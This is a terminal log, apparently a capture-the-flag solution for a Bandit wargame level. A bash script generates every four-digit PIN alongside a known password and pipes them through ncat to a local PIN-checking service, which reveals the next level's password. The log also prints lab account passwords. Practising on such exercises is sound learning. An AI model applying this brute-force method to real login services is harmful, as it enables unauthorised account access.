@@ -1,0 +1,41 @@
+bandit24@bandit:/tmp/tmp.2WPOx4WSLB$ ncat localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+
+bandit24@bandit:/tmp/tmp.2WPOx4WSLB$ cat a
+#!/bin/bash
+
+PASS=hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+
+> all_pincodes.txt
+
+for i in {0..9999}
+do
+    printf "$PASS %04d\n" $i >> all_pincodes.txt
+done
+
+bandit24@bandit:/tmp/tmp.2WPOx4WSLB$ head all_pincodes.txt
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0000
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0001
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0002
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0003
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0004
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0005
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0006
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0007
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0008
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0009
+
+bandit24@bandit:/tmp/tmp.2WPOx4WSLB$ ncat localhost 30002 < all_pincodes.txt  > log.txt
+bandit24@bandit:/tmp/tmp.2WPOx4WSLB$ tail log.txt
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Correct!
+The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
+
+password of bandit25: SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
+
